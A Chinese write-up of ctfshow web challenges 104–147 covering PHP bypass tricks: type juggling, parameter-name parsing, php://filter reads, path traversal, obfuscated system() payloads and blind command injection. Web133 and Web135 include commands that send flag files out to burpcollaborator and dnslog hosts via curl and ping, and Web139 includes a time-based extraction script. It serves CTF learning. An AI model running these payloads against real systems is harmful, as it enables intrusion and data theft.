<h1 id="Web104"><a href="#Web104" class="headerlink" title="Web104"></a>Web104</h1><p>sha1绕过</p>
<p>和md5绕过一样的</p>
<h1 id="Web105"><a href="#Web105" class="headerlink" title="Web105"></a>Web105</h1><p>这题就是很简单的变量传递即可，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?suces=flag</span><br><span class="line">post：error=suces</span><br></pre></td></tr></table></figure>

<h1 id="Web106"><a href="#Web106" class="headerlink" title="Web106"></a>Web106</h1><p>还是和104一样的sha1绕过1</p>
<h1 id="Web107"><a href="#Web107" class="headerlink" title="Web107"></a>Web107</h1><p>第一种方法</p>
<p>利用md5碰撞：使得v1中的flag&#x3D;0，然后v3&#x3D;0(md5(QNKCDZO)&#x3D;0e…)</p>
<p>payload：<code>vl=flag=0，v3=QNKCDZO)</code></p>
<p>第二种方法</p>
<p>数组绕过即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v3[]=2&amp;flag[]=32</span><br><span class="line">post：v1=v2=$_GET</span><br></pre></td></tr></table></figure>

<h1 id="Web108"><a href="#Web108" class="headerlink" title="Web108"></a>Web108</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ereg()限制password的格式，只能是数字或者字母。但ereg()函数存在NULL截断漏洞，可以使用%00绕过验证。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">①%00截断及遇到%00则默认为字符串的结束</span><br><span class="line"></span><br><span class="line">②当ntf为数组时它的返回值不是FALSE</span><br></pre></td></tr></table></figure>

<p>这题还要注意<a href="https://www.php.net/strrev">strrev函数</a>，反转字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=a%00778</span><br></pre></td></tr></table></figure>

<h1 id="Web109"><a href="#Web109" class="headerlink" title="Web109"></a>Web109</h1><p>这题使用反射类即可很简单的完成了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=ReflectionClass&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure>

<p>当然也可以使用别的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=Exception&amp;v2=system(&#x27;cat fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure>

<p>总结</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="built_in">Exception</span>();<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&amp;v2=a</span></span><br><span class="line">?v1=ReflectionClass&amp;v2=<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line">?v1=<span class="title function_ invoke__">ReflectionClass</span>(<span class="string">&quot;PDO&quot;</span>);<span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>);<span class="comment">//&amp;v2=a</span></span><br></pre></td></tr></table></figure>

<h1 id="Web110"><a href="#Web110" class="headerlink" title="Web110"></a>Web110</h1><p>FilesystemIterator获取目录文件</p>
<p>getcwd()函数取得当前工作目录</p>
<p><strong>构造playload：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v1=FilesystemIterator&amp;v2=getcwd</span><br></pre></td></tr></table></figure>

<p>得到当前目录的第一个文件名字：fl36dga.txt，然后访问即可，缺陷：只能获取第一个文件名字</p>
<h1 id="Web111"><a href="#Web111" class="headerlink" title="Web111"></a>Web111</h1><p>主要是全局变量</p>
<p>输出GLOBALS即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=sctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure>

<h1 id="Web112"><a href="#Web112" class="headerlink" title="Web112"></a>Web112</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可以直接用不带任何过滤器的filter伪协议</span><br><span class="line">file=php://filter/resource=flag.php</span><br><span class="line">也可以用一些没有过滤掉的编码方式和转换方式</span><br><span class="line">file=php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">file=compress.zlib://flag.php</span><br><span class="line">↑这是读取压缩流</span><br><span class="line">file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php</span><br><span class="line">file=php://filter/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">↑这是两位一反转的读取方式</span><br></pre></td></tr></table></figure>

<h1 id="Web113"><a href="#Web113" class="headerlink" title="Web113"></a>Web113</h1><p>这接着上面把filter禁掉了</p>
<p>利用上一道题目的payload可以继续打</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>

<p>利用目录溢出来做</p>
<p>inux里<code>/proc/self/root</code>是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code>，其实显示的内容是根目录下的内容<br>多次重复后绕过<code>is_file</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web114"><a href="#Web114" class="headerlink" title="Web114"></a>Web114</h1><p>把filter又放出来了，直接写就行</p>
<h1 id="Web115"><a href="#Web115" class="headerlink" title="Web115"></a>Web115</h1><p>这题需要写一个脚本去找到</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$num</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>).<span class="string">&#x27;36&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$num</span>)!==<span class="string">&#x27;36&#x27;</span> &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>) &amp;&amp; <span class="variable">$num</span>!==<span class="string">&#x27;36&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到：<code>%0C %2B(+) - . 0 1 2 3 4 5 6 7 8 9</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：%0C36</span><br></pre></td></tr></table></figure>

<h1 id="Web123"><a href="#Web123" class="headerlink" title="Web123"></a>Web123</h1><p>此处的php特性：在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：CTF[SHOW.COM&#x3D;&gt;CTF_SHOW.COM</p>
<p>payload：CTF_SHOW&#x3D;1&amp;CTF[SHOW.COM&#x3D;1&amp;fun&#x3D;echo $flag</p>
<h1 id="Web125"><a href="#Web125" class="headerlink" title="Web125"></a>Web125</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$_SERVER[&quot;QUERY_STRING&quot;]  获取查询 语句，实例中可知，获取的是?后面的值</span><br><span class="line">$_SERVER[&quot;REQUEST_URI&quot;]   获取 http://localhost 后面的值，包括/</span><br><span class="line">$_SERVER[&quot;SCRIPT_NAME&quot;]   获取当前脚本的路径，如：index.php</span><br><span class="line">$_SERVER[&quot;PHP_SELF&quot;]      当前正在执行脚本的文件名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0]) # POST</span><br><span class="line">?$fl0g=flag_give_me; #GET</span><br><span class="line">CTF_SHOW=6&amp;CTF[SHOW.COM=6&amp;fun=highlight_file($_GET[1])    #POST</span><br><span class="line">?1=flag.php		#GET</span><br></pre></td></tr></table></figure>

<p>现将变量fl0g赋值，再去执行命令</p>
<h1 id="Web126"><a href="#Web126" class="headerlink" title="Web126"></a>Web126</h1><p>和上题基本一样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">assert</span>() 断言：</span><br><span class="line"></span><br><span class="line">PHP <span class="number">5</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="keyword">string</span> <span class="variable">$description</span> ] )</span><br><span class="line"></span><br><span class="line">PHP <span class="number">7</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span> ( <span class="keyword">mixed</span> <span class="variable">$assertion</span> [, <span class="built_in">Throwable</span> <span class="variable">$exception</span> ] )</span><br><span class="line"></span><br><span class="line">如果 assertion 是字符串，它将会被 <span class="title function_ invoke__">assert</span>() 当做 PHP 代码来执行</span><br><span class="line">可见，<span class="keyword">eval</span>和assert都可以将字符当作代码执行，只不过assert不需要严格遵从语法，比如语句末尾的分号可不加</span><br><span class="line">?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">CTF_SHOW=<span class="number">6</span>&amp;CTF[SHOW.COM=<span class="number">6</span>&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<h1 id="Web127"><a href="#Web127" class="headerlink" title="Web127"></a>Web127</h1><p>?ctf_show&#x3D;ilove36d但是下划线被过滤了</p>
<p>自己写个fuzz脚本跑一下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$num</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="number">129</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">	<span class="variable">$num</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;未编码：&quot;</span>.<span class="variable">$num</span>.<span class="string">&quot;   经过编码：&quot;</span>.<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是这里我们的目的是利用空格、点、左中括号、+来被自动转换为下划线，经过fuzz得到空格，但是不知道为什么我空格经过URL编码确是+，但是%20确实符合该题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格 + . [`会被转化为`_</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ctf%20show=ilove36d</span><br></pre></td></tr></table></figure>

<h1 id="Web128"><a href="#Web128" class="headerlink" title="Web128"></a>Web128</h1><p>新知识：</p>
<p>gettext()函数有一个别名：<code>_ </code>           gettext()的作用就是输出一个字符串</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">_</span>()是<span class="title function_ invoke__">gettext</span>()的拓展函数</span><br><span class="line">在开启相关设定后，<span class="title function_ invoke__">_</span>(<span class="string">&quot;666&quot;</span>)等价于<span class="title function_ invoke__">gettext</span>(<span class="string">&quot;666&quot;</span>)，且就返回其中的参数</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gettext</span>(<span class="number">666</span>);   <span class="comment">//输出 666</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">_</span>(<span class="string">&quot;666&quot;</span>);		<span class="comment">//输出 666</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload: ?f1=_&amp;f2=get_defined_vars</span><br></pre></td></tr></table></figure>

<h1 id="Web129"><a href="#Web129" class="headerlink" title="Web129"></a>Web129</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strpos() - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</span><br><span class="line">stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</span><br><span class="line">strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</span><br><span class="line">strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</span><br></pre></td></tr></table></figure>

<p>这题需要使用目录穿越即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ctfshow/../flag.php</span><br><span class="line">?f=/ctfshow/../../../../../../../var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="Web130"><a href="#Web130" class="headerlink" title="Web130"></a>Web130</h1><p>直接post传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f=ctfshow</span><br></pre></td></tr></table></figure>

<h1 id="Web131"><a href="#Web131" class="headerlink" title="Web131"></a>Web131</h1><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>payload：<code>?f=ctfshow[]</code></p>
<h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>采用<code>数组</code>绕过的方法，<code>stripos函数</code>会返回<code>null</code>,<code>null!=false</code>,所以可以绕过stripos函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f[]=666</span><br></pre></td></tr></table></figure>

<h4 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h4><p>回溯次数溢出即可</p>
<p>写一个脚本</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://510d4c1f-2643-4f0e-b2ff-2f62679bf384.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">response=requests.post(url=url,data=&#123;</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;data&#x27;</span>*<span class="number">250000</span>+<span class="string">&#x27;36Dctfshow&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>

<h1 id="Web132"><a href="#Web132" class="headerlink" title="Web132"></a>Web132</h1><p>很简单的这题</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">false</span> &amp;&amp; <span class="literal">false</span> || <span class="literal">true</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;true!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;false!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回结果为true</span></span><br></pre></td></tr></table></figure>

<p>所以只需要满足后者就行：<code>$username ===&quot;admin&quot;</code></p>
<p>同时满足下一个if：<code>$code == &#39;admin&#39;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?username=admin&amp;password=1&amp;code=admin</span><br></pre></td></tr></table></figure>

<h1 id="Web133"><a href="#Web133" class="headerlink" title="Web133"></a>Web133</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们传递?F=`$F`;+sleep 3好像网站确实sleep了一会说明的确执行了命令</span><br><span class="line">**那为什么会这样？**</span><br><span class="line">因为是我们传递的`$F`;+sleep 3。先进行substr()函数截断然后去执行eval()函数</span><br><span class="line">这个函数的作用是执行php代码，``是shell_exec()函数的缩写，然后就去命令执行。</span><br><span class="line">而$F就是我们输入的`$F`;+sleep 3 使用最后执行的代码应该是</span><br><span class="line">``$F`;+sleep 3`,就执行成功</span><br><span class="line">这里可能有点绕，慢慢理解</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">?F=`$F `;+curl -X POST -F xx=@flag.php 6hokugw3tjr8vdj8f2yldiead1jt7i.burpcollaborator.net</span><br><span class="line"></span><br><span class="line"># -X POST  指定 HTTP 请求的方法为 POST</span><br><span class="line"># 其中-F 是带文件的形式发送post请求</span><br><span class="line"># xx是上传文件的name值，flag.php就是上传的文件 </span><br></pre></td></tr></table></figure>

<p>或者也可以使用dnslog</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://6d430dd8-2c69-4e3a-80e9-17df7cab12e0.challenge.ctf.show/?F=`$F`; ping `cat flag.php | grep ctfshow | tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.5c7zzo.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>

<p>不过这种特别容易失败不知道为什么。</p>
<h1 id="Web134"><a href="#Web134" class="headerlink" title="Web134"></a>Web134</h1><p>我们可以之间使用变量去绕过即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?_POST[key1]=<span class="number">36</span>d&amp;_POST[key2]=<span class="number">36</span>d</span><br></pre></td></tr></table></figure>

<h1 id="Web135"><a href="#Web135" class="headerlink" title="Web135"></a>Web135</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F` ;cp flag.php 666.txt</span><br><span class="line">?F=`$F` ;nl flag.php&gt;666.txt</span><br><span class="line">?F=`$F` ;mv flag.php 666.txt</span><br></pre></td></tr></table></figure>

<p>直接使用cp命令就可以完成了</p>
<p>或者也可以使用ping命令外带</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?F=`$F`; ping `nl flag.php|awk &#x27;NR==15&#x27;|tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.qvnuu2.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>

<p>就是这样还是很容易出不来</p>
<h1 id="Web136"><a href="#Web136" class="headerlink" title="Web136"></a>Web136</h1><p>直接使用linux的tee命令即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /|tee 1 访问1下载发现根目录下有flag payload: cat /f149_15_h3r3|tee 2 访问下载就OK</span><br></pre></td></tr></table></figure>

<h1 id="Web137"><a href="#Web137" class="headerlink" title="Web137"></a>Web137</h1><p>这题直接调用静态类即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<h1 id="Web138"><a href="#Web138" class="headerlink" title="Web138"></a>Web138</h1><p>利用call_user_func的性质即可，我们传递一个数组进去，使其调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(array($classname, &#x27;say_hello&#x27;));</span><br><span class="line">调用classname这个类里的sya_hello方法</span><br><span class="line"></span><br><span class="line">array[0]=$classname  类名</span><br><span class="line">array[1]=say_hello   say_hello()方法</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</span><br></pre></td></tr></table></figure>

<h1 id="Web139"><a href="#Web139" class="headerlink" title="Web139"></a>Web139</h1><p>这题就稍微有点难度，需要使用盲注</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import requests</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># url = &quot;http://7bbfdea8-0683-43fe-a382-62f9db7b00b5.challenge.ctf.show/?c=&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;if [ `ls / -1 | cut -c &#123;&#125; | awk \&quot;NR==&#123;&#125;\&quot;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># result = &quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># row = 6</span></span><br><span class="line"><span class="comment"># length = 20</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># strings = &quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># for r in range(1,row):</span></span><br><span class="line"><span class="comment">#     for c in range(1,length):</span></span><br><span class="line"><span class="comment">#         for s in strings:</span></span><br><span class="line"><span class="comment">#             target = url+payload.format(c,r,s)</span></span><br><span class="line"><span class="comment">#             try:</span></span><br><span class="line"><span class="comment">#                 requests.get(target,timeout=3)</span></span><br><span class="line"><span class="comment">#             except:</span></span><br><span class="line"><span class="comment">#                 result+=s</span></span><br><span class="line"><span class="comment">#                 print(result)</span></span><br><span class="line"><span class="comment">#                 break</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#     result+=&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7bbfdea8-0683-43fe-a382-62f9db7b00b5.challenge.ctf.show/?c=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;if [ `cat /f149_15_h3r3 | cut -c &#123;&#125;` == \&quot;&#123;&#125;\&quot; ];then sleep 3;fi&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;++++++++++++++++++++++&quot;</span></span><br><span class="line"></span><br><span class="line">length = <span class="number">48</span></span><br><span class="line"></span><br><span class="line">strings = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz_-0123456789&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,length):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strings:</span><br><span class="line">        target = url+payload.<span class="built_in">format</span>(c,s)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.get(target,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            result+=s</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    result+=<span class="string">&quot; &quot;</span></span><br></pre></td></tr></table></figure>

<p>最后就得到了flag</p>
<h1 id="Web140"><a href="#Web140" class="headerlink" title="Web140"></a>Web140</h1><p><strong><code>0==“字符串”</code> 返回的是TRUE</strong></p>
<p>intval会将非数字字符转换为0，也就是说 <code>intval(&#39;a&#39;)==0 intval(&#39;.&#39;)==0 intval(&#39;/&#39;)==0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(phpinfo())</span><br><span class="line">md5(sleep())</span><br><span class="line">md5(md5())</span><br><span class="line">current(localeconv)</span><br><span class="line">sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1</span><br><span class="line">post f1=usleep&amp;f2=usleep</span><br><span class="line">post f1=gmdate&amp;f2=gmdate</span><br><span class="line">post f1=intval&amp;f2=intval</span><br></pre></td></tr></table></figure>

<h1 id="Web141"><a href="#Web141" class="headerlink" title="Web141"></a>Web141</h1><p>这主要是可以通过取反绕过</p>
<p>拓展：各种无数字字母绕过<a href="https://blog.csdn.net/miuzzx/article/details/109143413%E2%80%98">https://blog.csdn.net/miuzzx/article/details/109143413‘</a></p>
<p>绕过return的方式：<br>php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 1-phpinfo();结合减号是可以执行phpinfo()命令的。（不一定是减号，还有加、乘、除号，若用加号。要用+，要进行URL编码，这是个特殊字符，不进行编码会当作空格）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system(tac f*);</span><br><span class="line">经过取反处理</span><br><span class="line">(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);</span><br><span class="line">payload：</span><br><span class="line">?v1=1&amp;v3=-(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5);-&amp;v2=1</span><br><span class="line"></span><br><span class="line">?v1=1&amp;v2=2&amp;v3=-(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)-</span><br></pre></td></tr></table></figure>

<h1 id="Web142"><a href="#Web142" class="headerlink" title="Web142"></a>Web142</h1><p>直接传0就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">?v1=0   	八进制</span><br><span class="line">?v1=0x0		16进制</span><br><span class="line">?v1=0e123	科学计数法</span><br></pre></td></tr></table></figure>

<h1 id="Web143"><a href="#Web143" class="headerlink" title="Web143"></a>Web143</h1><p>这题是141的升级版，我们用异或即可。</p>
<p>并且没有过滤乘号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=2&amp;v3=*(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%02%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2c%60%60%60&quot;)?&gt;</span><br><span class="line"></span><br><span class="line">?v1=1&amp;v2=2&amp;v3=-(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)-</span><br></pre></td></tr></table></figure>

<h1 id="Web144"><a href="#Web144" class="headerlink" title="Web144"></a>Web144</h1><p>直接换个位置就行了这题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v3=-&amp;v2=(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%fa%fa%fa%fa%fa%fa%fa^%8e%9b%99%da%d0%9b%d0)</span><br></pre></td></tr></table></figure>

<h1 id="Web145"><a href="#Web145" class="headerlink" title="Web145"></a>Web145</h1><p>可以使用冒号问号连接</p>
<p>测试：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这是可以运行出来的</p>
<p>所以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=%0a1&amp;v2=%0a0&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):</span><br></pre></td></tr></table></figure>

<h1 id="Web146"><a href="#Web146" class="headerlink" title="Web146"></a>Web146</h1><p>又增加了分号的过滤，所以我们没法用三目运算符了，这时候想到了等号和位运算符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>继续套就行</p>
<h1 id="Web147"><a href="#Web147" class="headerlink" title="Web147"></a>Web147</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/i不区分大小写</span><br><span class="line">/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[\f\n\r\t\v]</span><br><span class="line">/D如果使用$限制结尾字符,则不允许结尾有换行</span><br></pre></td></tr></table></figure>

<p>由于命名空间问题，如果要绝对调用一个函数，例如system，那么就要写成<code>\system</code></p>
<p>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写 法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?show=;&#125;;phpinfo();/*</span><br><span class="line">ctf=\create_function</span><br></pre></td></tr></table></figure>

<p>紧接着就到了如何只控制第二个参数来执行命令的问题了，后来找到可以用<code>create_function</code>来完成，<code>create_function</code>的第一个参数是参数，第二个参数是内容。</p>
<p>函数结构形似</p>
